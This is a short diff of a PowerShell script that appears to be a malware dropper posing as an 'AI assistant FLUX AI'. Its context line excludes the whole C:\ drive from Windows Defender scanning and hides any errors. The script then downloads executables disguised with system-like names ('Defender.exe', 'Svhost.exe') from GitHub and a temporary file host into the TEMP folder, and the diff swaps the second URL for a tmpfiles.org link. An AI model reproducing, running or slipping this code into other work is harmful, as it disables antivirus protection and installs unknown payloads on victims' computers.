@@ -19,7 +19,7 @@ Add-MpPreference -ExclusionPath "C:\" -Force -ErrorAction SilentlyContinue
 
 Write-Host "HI I AM AI ASSISTANT FLUX AI"
 $url1 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Defender.exe"
-$url2 = "https://github.com/sys1e/winlogo/raw/refs/heads/main/Svhost.exe"
+$url2 = "http://tmpfiles.org/dl/33230718/zxczxczxc.exe"
 $path1 = "$env:TEMP\Defender.exe"
 $path2 = "$env:TEMP\Svhost.exe"
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
